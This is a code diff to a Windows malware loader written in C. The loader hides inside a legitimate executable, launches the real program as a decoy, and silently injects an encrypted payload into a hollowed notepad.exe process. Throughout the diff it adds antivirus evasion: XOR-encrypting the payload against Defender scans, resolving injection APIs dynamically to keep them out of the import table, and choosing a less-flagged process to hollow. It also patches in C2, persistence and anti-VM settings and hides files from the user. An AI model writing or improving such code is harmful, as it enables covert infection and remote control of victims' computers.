@@ -13,6 +13,16 @@
 //   [loader.exe][host.exe bytes][host_len:4 LE][magic "CKLG":4]
 //   it extracts the original host, launches it normally (installer/GUI appears),
 //   and runs the payload silently via process hollowing -- no visible window.
+//
+//   AV EVASION (v4):
+//   - Payload DLL is XOR-encrypted in payload.h. Decrypted at runtime before injection.
+//     This prevents Defender from statically scanning the payload's imports/strings.
+//   - Suspicious API calls (WriteProcessMemory, VirtualAllocEx, VirtualProtectEx,
+//     CreateRemoteThread) are resolved dynamically via GetProcAddress, removing them
+//     from the loader's IAT.
+//   - Sacrificial process is notepad.exe (cmd.exe hollowing is a known signature).
+//   - C2/persist/anti-VM sentinels are in the LOADER's .data section (plaintext, patchable
+//     by auto.py). At runtime, the loader patches them into the decrypted payload buffer.
 #define WIN32_LEAN_AND_MEAN
 #define _WIN32_WINNT 0x0600
 #if defined(_WIN32) || defined(_WIN64)
@@ -32,14 +42,29 @@
 #endif
 #include <stdio.h>
 #include <stdlib.h>
-#include "payload.h"                 // extern unsigned char g_payload[]; extern unsigned g_payload_len;
+#include <string.h>
+#include "payload.h"                 // g_payload_enc[], g_xor_key[16], g_payload_len
 
 // GUI subsystem: no console window when the victim double-clicks the infected exe
 #pragma comment(linker, "/SUBSYSTEM:WINDOWS")
 #pragma comment(linker, "/ENTRY:wmainCRTStartup")
 
-typedef LONG (WINAPI *tUnmap)(HANDLE,PVOID);
-typedef LONG (WINAPI *tNCTE)(HANDLE*,ACCESS_MASK,PVOID,PVOID,PVOID,PVOID,ULONG,ULONG,ULONG,ULONG,PVOID);
+// ------------------------------------------------------------------ sentinels (loader's own copies)
+// auto.py/pick.py find these in loader.exe and overwrite with real values.
+// At runtime, DecryptPayload() copies these into the decrypted payload buffer.
+static char g_c2_url[256]  = "CKC2_DEADBEEF_";               // C2 URL (14-byte sentinel)
+static char g_persist[8]   = {'C','K','P','R','_','_','_','_'}; // persistence flag
+static char g_skip_av[8]   = {'C','K','A','V','0','0','0','0'}; // anti-VM skip flag
+
+// ------------------------------------------------------------------ dynamic API resolution
+// These functions are NOT in the IAT — resolved at runtime to avoid heuristic detection.
+typedef BOOL   (WINAPI *tWriteProcessMemory)(HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T*);
+typedef LPVOID (WINAPI *tVirtualAllocEx)(HANDLE,LPVOID,SIZE_T,DWORD,DWORD);
+typedef BOOL   (WINAPI *tVirtualProtectEx)(HANDLE,LPVOID,SIZE_T,DWORD,PDWORD);
+typedef HANDLE (WINAPI *tCreateRemoteThread)(HANDLE,LPSECURITY_ATTRIBUTES,SIZE_T,
+                                              LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);
+typedef LONG   (WINAPI *tUnmap)(HANDLE,PVOID);
+typedef LONG   (WINAPI *tNCTE)(HANDLE*,ACCESS_MASK,PVOID,PVOID,PVOID,PVOID,ULONG,ULONG,ULONG,ULONG,PVOID);
 
 static PIMAGE_DOS_HEADER Mz(void* b){ return (PIMAGE_DOS_HEADER)b; }
 static PIMAGE_NT_HEADERS Nt(void* b){
@@ -49,14 +74,52 @@ static PIMAGE_NT_HEADERS Nt(void* b){
 }
 static bool IsClr(void* b){ PIMAGE_NT_HEADERS n=Nt(b); return n && n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress!=0; }
 
-// Convert RVA (relative virtual address) to raw file offset (in g_payload buffer)
+// Convert RVA (relative virtual address) to raw file offset
 static DWORD Rva2Off(PIMAGE_NT_HEADERS nt, DWORD rva){
     PIMAGE_SECTION_HEADER sec=IMAGE_FIRST_SECTION(nt);
     for(WORD i=0;i<nt->FileHeader.NumberOfSections;i++,sec++){
         if(rva>=sec->VirtualAddress && rva<sec->VirtualAddress+sec->Misc.VirtualSize)
             return rva-sec->VirtualAddress+sec->PointerToRawData;
     }
-    return rva; // fallback: 1:1 mapping
+    return rva;
+}
+
+// ------------------------------------------------------------------ payload decryption + sentinel patching
+// Decrypts the XOR-encrypted payload, patches the C2/persist/anti-VM sentinels
+// from the loader's own copies into the decrypted buffer, and returns it.
+// Caller must free() the returned buffer.
+static BYTE* DecryptPayload(void){
+    BYTE* buf = (BYTE*)malloc(g_payload_len);
+    if(!buf) return NULL;
+    // XOR decrypt
+    for(unsigned i=0; i<g_payload_len; i++)
+        buf[i] = g_payload_enc[i] ^ g_xor_key[i & 15];
+
+    // Patch C2 sentinel: search for "CKC2_DEADBEEF_" (14 bytes) in decrypted payload
+    const char c2_sentinel[14] = {'C','K','C','2','_','D','E','A','D','B','E','E','F','_'};
+    for(unsigned i=0; i+14 <= g_payload_len; i++){
+        if(memcmp(buf+i, c2_sentinel, 14)==0){
+            memcpy(buf+i, g_c2_url, 256);
+            break;
+        }
+    }
+    // Patch persistence sentinel: search for "CKPR____" (8 bytes)
+    const char pr_sentinel[8] = {'C','K','P','R','_','_','_','_'};
+    for(unsigned i=0; i+8 <= g_payload_len; i++){
+        if(memcmp(buf+i, pr_sentinel, 8)==0){
+            memcpy(buf+i, g_persist, 8);
+            break;
+        }
+    }
+    // Patch anti-VM sentinel: search for "CKAV0000" (8 bytes)
+    const char av_sentinel[8] = {'C','K','A','V','0','0','0','0'};
+    for(unsigned i=0; i+8 <= g_payload_len; i++){
+        if(memcmp(buf+i, av_sentinel, 8)==0){
+            memcpy(buf+i, g_skip_av, 8);
+            break;
+        }
+    }
+    return buf;
 }
 
 int wmain(int argc,wchar_t** argv){
@@ -72,7 +135,7 @@ int wmain(int argc,wchar_t** argv){
     // Standalone mode: if no -p target given, look for a host exe appended to this exe.
     // Format: [loader.exe][host.exe bytes][host_len:4 LE][magic "CKLG":4]
     // Flow: extract original host -> launch normally (game/installer appears) ->
-    //       hollow a sacrificial cmd.exe with the payload -> payload runs hidden
+    //       hollow a sacrificial notepad.exe with the payload -> payload runs hidden
     if(!target){
         wchar_t self[MAX_PATH]; GetModuleFileNameW(NULL,self,MAX_PATH);
         HANDLE hs=CreateFileW(self,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
@@ -109,8 +172,6 @@ int wmain(int argc,wchar_t** argv){
 
                         // Temp name to stash the infected exe: <dir>\~ck_bak.bin
                         // Hidden + System attributes so it doesn't show in Explorer
-                        // (even with "show hidden files" it won't appear unless
-                        // "show protected system files" is also enabled)
                         wchar_t bak[MAX_PATH]; lstrcpyW(bak,wdir);
                         lstrcatW(bak,L"~ck_bak.bin");
                         DeleteFileW(bak);
@@ -119,7 +180,6 @@ int wmain(int argc,wchar_t** argv){
                         wchar_t origName[MAX_PATH]; lstrcpyW(origName,self);
 
                         // Rename infected -> ~ck_bak.bin
-                        // (may fail if AV blocks; in that case fall back to ~ck_tmp.exe)
                         BOOL renamed = MoveFileExW(origName,bak,MOVEFILE_REPLACE_EXISTING);
 
                         // Hide ~ck_bak.bin immediately after rename
@@ -137,8 +197,7 @@ int wmain(int argc,wchar_t** argv){
                             }
                             lstrcpyW(runExe,origName);
                         } else {
-                            // Fallback: extract as ~ck_tmp.exe (works for apps that
-                            // don't depend on the exe name)
+                            // Fallback: extract as ~ck_tmp.exe
                             lstrcpyW(runExe,wdir); lstrcatW(runExe,L"~ck_tmp.exe");
                             HANDLE htmp=CreateFileW(runExe,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,
                                                     FILE_ATTRIBUTE_HIDDEN,NULL);
@@ -149,7 +208,6 @@ int wmain(int argc,wchar_t** argv){
                         VirtualFree(hbuf,0,MEM_RELEASE);
 
                         // 3. Launch original host normally (game/installer/GUI appears)
-                        //    Working directory = directory of the infected .exe
                         STARTUPINFOW si2={sizeof(si2)};
                         si2.dwFlags=STARTF_USESHOWWINDOW;
                         si2.wShowWindow=SW_SHOWNORMAL;
@@ -172,7 +230,6 @@ int wmain(int argc,wchar_t** argv){
 
                         // 3b. Clean up the temp file
                         if(renamed){
-                            // ~ck_bak.bin: delete now or schedule for reboot
                             if(!DeleteFileW(bak))
                                 MoveFileExW(bak,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);
                         } else {
@@ -180,10 +237,16 @@ int wmain(int argc,wchar_t** argv){
                                 MoveFileExW(runExe,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);
                         }
 
-                        // 4. Sacrificial process for hollowing: cmd.exe from System32
-                        //    Created SUSPENDED -> code replaced with payload -> never shows a window
+                        // 4. Sacrificial process for hollowing: notepad.exe from System32
+                        //    cmd.exe hollowing is a well-known Defender signature.
+                        //    notepad.exe is less flagged and always present on Win10/11.
                         GetSystemDirectoryW(target_buf,MAX_PATH);
-                        lstrcatW(target_buf,L"\\cmd.exe");
+                        lstrcatW(target_buf,L"\\notepad.exe");
+                        // Fallback: if notepad.exe doesn't exist (very unlikely), use cmd.exe
+                        if(GetFileAttributesW(target_buf)==INVALID_FILE_ATTRIBUTES){
+                            GetSystemDirectoryW(target_buf,MAX_PATH);
+                            lstrcatW(target_buf,L"\\cmd.exe");
+                        }
                         target=target_buf; kill=true;
                         wait=20000;    // payload needs ~10s (pipe retry) + extraction time
                         // falls through to hollowing code below
@@ -195,7 +258,6 @@ int wmain(int argc,wchar_t** argv){
     }
 
     if(!target){
-        // Should never happen in standalone mode, but keep for CLI usage
         return 1;
     }
 
@@ -209,34 +271,49 @@ int wmain(int argc,wchar_t** argv){
     CloseHandle(hf);
     if(purge) MoveFileExW(target,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);
 
-    // 2. Create sacrificial process in suspended state
+    // 2. Decrypt the XOR-encrypted payload and patch sentinels
+    BYTE* g_payload = DecryptPayload();
+    if(!g_payload){ return 6; }
+
+    // 3. Resolve suspicious APIs dynamically (removes them from IAT)
+    HMODULE k32 = GetModuleHandleA("kernel32.dll");
+    HMODULE nt  = GetModuleHandleA("ntdll.dll");
+    tWriteProcessMemory pWriteProcessMemory = (tWriteProcessMemory)GetProcAddress(k32,"WriteProcessMemory");
+    tVirtualAllocEx      pVirtualAllocEx    = (tVirtualAllocEx)GetProcAddress(k32,"VirtualAllocEx");
+    tVirtualProtectEx   pVirtualProtectEx  = (tVirtualProtectEx)GetProcAddress(k32,"VirtualProtectEx");
+    tCreateRemoteThread  pCreateRemoteThread= (tCreateRemoteThread)GetProcAddress(k32,"CreateRemoteThread");
+    tUnmap unmap=(tUnmap)GetProcAddress(nt,"NtUnmapViewOfSection");
+    tNCTE  ncte=(tNCTE)GetProcAddress(nt,"NtCreateThreadEx");
+    if(!pWriteProcessMemory || !pVirtualAllocEx || !pVirtualProtectEx){
+        free(g_payload); return 7;
+    }
+
+    // 4. Create sacrificial process in suspended state
     STARTUPINFOW si={sizeof(si)}; PROCESS_INFORMATION pi;
     si.dwFlags=STARTF_USESHOWWINDOW; si.wShowWindow=SW_HIDE;
     if(!CreateProcessW(target,NULL,NULL,NULL,FALSE,CREATE_SUSPENDED|CREATE_BREAKAWAY_FROM_JOB,NULL,NULL,&si,&pi)){
-        return 3; }
+        free(g_payload); return 3;
+    }
 
-    // 3. Unmap the host's original code (NtUnmapViewOfSection)
+    // 5. Unmap the host's original code (NtUnmapViewOfSection)
     PIMAGE_NT_HEADERS pn=Nt(g_payload);
-    HMODULE nt=GetModuleHandleA("ntdll.dll");
-    tUnmap unmap=(tUnmap)GetProcAddress(nt,"NtUnmapViewOfSection");
     if(unmap) unmap(pi.hProcess,(PVOID)(ULONG_PTR)hn->OptionalHeader.ImageBase);
 
-    // 4. Map the payload at its fixed base (compiled /DYNAMICBASE:NO -> no relocation needed)
+    // 6. Map the payload at its fixed base (compiled /DYNAMICBASE:NO -> no relocation needed)
     SIZE_T sz=pn->OptionalHeader.SizeOfImage;
-    PVOID base=VirtualAllocEx(pi.hProcess,(PVOID)(ULONG_PTR)pn->OptionalHeader.ImageBase,sz,
+    PVOID base=pVirtualAllocEx(pi.hProcess,(PVOID)(ULONG_PTR)pn->OptionalHeader.ImageBase,sz,
                               MEM_RESERVE|MEM_COMMIT,PAGE_READWRITE);
-    if(!base){ TerminateProcess(pi.hProcess,0); return 4; }
+    if(!base){ TerminateProcess(pi.hProcess,0); free(g_payload); return 4; }
     SIZE_T wr=0;
-    WriteProcessMemory(pi.hProcess,base,g_payload,pn->OptionalHeader.SizeOfHeaders,&wr);
+    pWriteProcessMemory(pi.hProcess,base,g_payload,pn->OptionalHeader.SizeOfHeaders,&wr);
     PIMAGE_SECTION_HEADER sh=IMAGE_FIRST_SECTION(pn);
     for(WORD i=0;i<pn->FileHeader.NumberOfSections;i++,sh++){
         if(!sh->SizeOfRawData) continue;
-        WriteProcessMemory(pi.hProcess,(BYTE*)base+sh->VirtualAddress,
+        pWriteProcessMemory(pi.hProcess,(BYTE*)base+sh->VirtualAddress,
                            g_payload+sh->PointerToRawData,sh->SizeOfRawData,&wr);
     }
 
-    // 5. Fix IAT: only system DLLs, which have the SAME base in every process of this session
-    //    Read descriptors from g_payload (local buffer), not from base (target process memory)
+    // 7. Fix IAT: only system DLLs, which have the SAME base in every process of this session
     DWORD imp_rva=pn->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
     if(imp_rva){
         PIMAGE_IMPORT_DESCRIPTOR imp=(PIMAGE_IMPORT_DESCRIPTOR)(g_payload+Rva2Off(pn,imp_rva));
@@ -257,40 +334,40 @@ int wmain(int argc,wchar_t** argv){
                 }
                 ULONG_PTR v=(ULONG_PTR)a;
                 PVOID remote_thunk=(BYTE*)base+th_rva+idx*sizeof(IMAGE_THUNK_DATA);
-                WriteProcessMemory(pi.hProcess,remote_thunk,&v,sizeof(v),&wr);
+                pWriteProcessMemory(pi.hProcess,remote_thunk,&v,sizeof(v),&wr);
             }
             imp++;
         }
     }
 
-    // 6. Set per-section memory protection (no global RWX) and create hidden thread
+    // 8. Set per-section memory protection (no global RWX) and create hidden thread
     sh=IMAGE_FIRST_SECTION(pn);
     for(WORD i=0;i<pn->FileHeader.NumberOfSections;i++,sh++){
         DWORD p=PAGE_READONLY,f=sh->Characteristics;
         if(f&IMAGE_SCN_MEM_EXECUTE) p=(f&IMAGE_SCN_MEM_WRITE)?PAGE_EXECUTE_READWRITE:PAGE_EXECUTE_READ;
         else if(f&IMAGE_SCN_MEM_WRITE) p=PAGE_READWRITE;
-        VirtualProtectEx(pi.hProcess,(BYTE*)base+sh->VirtualAddress,sh->Misc.VirtualSize,p,&p);
+        pVirtualProtectEx(pi.hProcess,(BYTE*)base+sh->VirtualAddress,sh->Misc.VirtualSize,p,&p);
     }
     HANDLE th=NULL;
-    tNCTE ncte=(tNCTE)GetProcAddress(nt,"NtCreateThreadEx");
     ULONG_PTR arg=1;                                    // DLL_PROCESS_ATTACH
     BOOL spawned=FALSE;
     if(ncte) spawned = ncte(&th,THREAD_ALL_ACCESS,NULL,pi.hProcess,
                             (PVOID)((BYTE*)base+pn->OptionalHeader.AddressOfEntryPoint),
                             (PVOID)arg,NULL,0x1/*HIDE_FROM_DEBUGGER*/,0,0,NULL) >= 0;
-    if(!spawned){                                       // fallback: standard remote thread
-        th=CreateRemoteThread(pi.hProcess,NULL,0,
+    if(!spawned && pCreateRemoteThread){
+        th=pCreateRemoteThread(pi.hProcess,NULL,0,
             (LPTHREAD_START_ROUTINE)((BYTE*)base+pn->OptionalHeader.AddressOfEntryPoint),
             (PVOID)arg,0,&pi.dwThreadId); spawned=(th!=NULL);
     }
-    if(!spawned){ TerminateProcess(pi.hProcess,0); return 5; }
+    if(!spawned){ TerminateProcess(pi.hProcess,0); free(g_payload); return 5; }
 
-    // 7. Payload does its work on the remote thread.
+    // 9. Payload does its work on the remote thread.
     //    DO NOT resume the main thread -- the original entry point was unmapped
     //    by NtUnmapViewOfSection; resuming causes an access violation that kills the
     //    entire process (and the payload with it). The remote thread runs on its own.
     WaitForSingleObject(th,wait);
     if(kill) TerminateProcess(pi.hProcess,0);
     CloseHandle(th); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
+    free(g_payload);
     return 0;
 }
